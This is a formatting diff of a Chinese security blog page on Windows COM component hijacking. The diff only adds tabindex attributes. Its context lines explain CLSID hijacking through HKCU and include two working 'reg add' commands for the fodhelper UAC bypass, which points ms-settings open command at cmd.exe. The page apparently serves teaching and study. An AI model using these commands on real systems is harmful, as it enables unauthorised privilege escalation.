@@ -298,7 +298,7 @@ CLSID结构体<span style="color:#960050;background-color:#1e0010">：</span>
 </tr>
 </tbody>
 </table>
-<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID   
+<pre tabindex="0"><code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID   
  	{CLSID}       
 	InprocServer32          (Default) = path          
 	ThreadingModel 	    = value
@@ -313,7 +313,7 @@ CLSID结构体<span style="color:#960050;background-color:#1e0010">：</span>
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-22/0x08.png" alt=""></p>
 <h2 id="0x09-com组件的劫持原理">0x09 COM组件的劫持原理</h2>
 <p>当进程寻找COM组件时，首先会寻找：</p>
-<pre><code>HKCU\Software\Classes\CLSID
+<pre tabindex="0"><code>HKCU\Software\Classes\CLSID
 </code></pre><p>我们直接在CLSID下新建一个对象ID，就能够劫持某个进程或多个进程。</p>
 <p>与DLL劫持原理相近，但是COM组件的劫持可以拓展很多东西，劫持的目标不一定是一个进程，劫持所需的文件不一定是一个DLL，它可以是一个.com文件、二进制PE文件、DLL文件，劫持的目标也可以是一个Windows API。</p>
 <h2 id="0x10-实现一个com组件劫持">0x10 实现一个COM组件劫持</h2>
@@ -364,7 +364,7 @@ CLSID结构体<span style="color:#960050;background-color:#1e0010">：</span>
 <p>Path：C:\Windows\system32\fodhelper.exe</p>
 <p>REG：HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command</p>
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-22/0x12.png" alt=""></p>
-<pre><code>reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d C:\Windows\System32\cmd.exe /f
+<pre tabindex="0"><code>reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d C:\Windows\System32\cmd.exe /f
 reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 00000000 /f
 </code></pre><video src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-22/bypass_uac.mp4" controls="controls" width="500px">
 哎呀~ 换个浏览器试试吧！
